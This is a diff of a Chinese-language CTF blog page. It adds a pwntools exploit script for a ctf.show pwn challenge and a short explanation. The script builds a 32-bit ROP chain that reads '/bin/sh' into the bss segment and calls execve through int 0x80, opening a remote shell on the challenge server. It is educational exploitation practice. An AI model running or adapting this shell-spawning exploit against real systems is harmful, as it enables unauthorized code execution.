+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span><span class="p">,</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;i386&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;pwn.challenge.ctf.show&#34;</span><span class="p">,</span> <span class="mi">28266</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#io = process(&#39;./pwn&#39;)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">pop_eax_ret</span> <span class="o">=</span> <span class="mh">0x080bb2c6</span>
+</span></span><span class="line"><span class="cl"><span class="n">pop_edx_ecx_ebx_ret</span> <span class="o">=</span> <span class="mh">0x0806ecb0</span>
+</span></span><span class="line"><span class="cl"><span class="n">int_0x80</span> <span class="o">=</span> <span class="mh">0x0806F350</span>
+</span></span><span class="line"><span class="cl"><span class="n">bss</span> <span class="o">=</span> <span class="mh">0x080eb000</span>
+</span></span><span class="line"><span class="cl"><span class="n">bin_sh</span> <span class="o">=</span> <span class="s2">&#34;/bin/sh</span><span class="se">\x00</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mi">44</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">pop_eax_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x3</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">pop_edx_ecx_ebx_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x10</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">bss</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">int_0x80</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">pop_eax_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xb</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">pop_edx_ecx_ebx_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">bss</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">int_0x80</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;system?&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<p>执行后，程序会阻塞等待用户输入，此时发送 <code>bin_sh = &quot;/bin/sh\x00&quot;</code>，<code>read</code> 会将该字符串写入 <code>bss</code> 段（<code>0x080eb000</code> 地址处）；</p>
+<p>此时 <code>bss</code> 地址指向的内容就是 <code>&quot;/bin/sh\x00&quot;</code>，满足 <code>execve</code> 对 “命令路径参数” 的要求。</p></blockquote>
 <h3 id="pwn_073">PWN_073
 </h3><p>题目：愉快的尝试一下一把梭吧！ <a class="link" href="PWN_073" >PWN_073</a></p>
 <p>checksec：</p>
@@ -8862,7 +9246,7 @@ unicode: "ece7"
 
 
         <span>
-            最后更新于 2025-09-26
+            最后更新于 2025-09-30
         </span>
     </section></footer>
 
@@ -9092,7 +9476,7 @@ unicode: "ece7"
 <section class="wordcount">
   <div class="wordcount-row">
     <p>博主发布了7篇文章  ||</p>
-    <p>总共161.41k 字</p>
+    <p>总共163.54k 字</p>
   </div>
 </section>
         
